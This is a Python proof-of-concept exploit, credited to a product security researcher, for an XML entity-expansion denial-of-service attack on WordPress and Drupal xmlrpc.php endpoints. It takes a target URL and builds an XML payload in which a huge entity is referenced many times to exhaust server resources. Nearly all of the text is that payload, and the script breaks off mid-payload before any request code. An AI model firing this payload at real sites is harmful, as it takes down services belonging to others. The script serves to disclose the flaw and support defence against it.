#################################################################################
# CVE-XXXXX Wordpress and Drupal XML Blowup Attack DoS#
# Author: Nir Goldshlager - Salesforce.com Product Security Team#
# This is a Proof of Concept Exploit, Please use responsibly.#
#################################################################################
#!/usr/bin/env python
from __future__ import print_function
import threading
import sys
import time
import urllib
import urllib2
try:
	target=sys.argv[1]
except:
	time.sleep(1)
	print('[*] Enter Your Target .. \n \t\n [!] Example : python2 wp_dos.py http://wordpress.com/xmlrpc.php')
	sys.exit()
data = """<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE lolz [
 <!ENTITY poc "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<methodCall>
  <methodName>aaa&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc